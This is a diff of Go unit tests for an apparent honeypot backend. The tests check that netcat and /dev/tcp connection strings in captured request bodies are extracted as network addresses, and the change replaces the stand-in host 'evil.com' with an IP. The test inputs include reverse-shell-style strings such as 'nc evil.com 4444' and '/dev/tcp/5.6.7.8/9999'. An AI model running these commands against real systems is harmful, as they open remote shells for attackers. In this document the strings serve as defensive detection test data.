@@ -2502,7 +2502,7 @@ func TestIterateMetadata_Netcat(t *testing.T) {
 	fdbc := &database.FakeDatabaseClient{}
 	b := newTestBackendServer(t, fdbc)
 
-	req := &models.Request{ID: 1, HoneypotIP: "10.0.0.1", SourceIP: "1.2.3.4", Body: []byte("nc evil.com 4444")}
+	req := &models.Request{ID: 1, HoneypotIP: "10.0.0.1", SourceIP: "1.2.3.4", Body: []byte("nc 5.6.7.8 4444")}
 	eCol := extractors.NewExtractorCollection(true)
 	eCol.ParseRequest(req)
 	err := b.ProcessRequest(req, models.ContentRule{Enabled: true, ID: 1}, eCol)
@@ -2513,7 +2513,7 @@ func TestIterateMetadata_Netcat(t *testing.T) {
 	b.networkFetchQueueMu.Unlock()
 
 	require.Len(t, cmds, 1)
-	assert.Equal(t, "evil.com", cmds[0].Address)
+	assert.Equal(t, "5.6.7.8", cmds[0].Address)
 	assert.Equal(t, int64(4444), cmds[0].Port)
 	assert.Equal(t, backend_service.NetworkProtocol_PROTOCOL_TCP, cmds[0].Protocol)
 }
@@ -2522,7 +2522,7 @@ func TestIterateMetadata_TcpLink(t *testing.T) {
 	fdbc := &database.FakeDatabaseClient{}
 	b := newTestBackendServer(t, fdbc)
 
-	req := &models.Request{ID: 1, HoneypotIP: "10.0.0.1", SourceIP: "1.2.3.4", Body: []byte("/dev/tcp/evil.com/9999")}
+	req := &models.Request{ID: 1, HoneypotIP: "10.0.0.1", SourceIP: "1.2.3.4", Body: []byte("/dev/tcp/5.6.7.8/9999")}
 	eCol := extractors.NewExtractorCollection(true)
 	eCol.ParseRequest(req)
 	err := b.ProcessRequest(req, models.ContentRule{Enabled: true, ID: 1}, eCol)
@@ -2533,7 +2533,7 @@ func TestIterateMetadata_TcpLink(t *testing.T) {
 	b.networkFetchQueueMu.Unlock()
 
 	require.Len(t, cmds, 1)
-	assert.Equal(t, "evil.com", cmds[0].Address)
+	assert.Equal(t, "5.6.7.8", cmds[0].Address)
 	assert.Equal(t, int64(9999), cmds[0].Port)
 	assert.Equal(t, backend_service.NetworkProtocol_PROTOCOL_TCP, cmds[0].Protocol)
 }
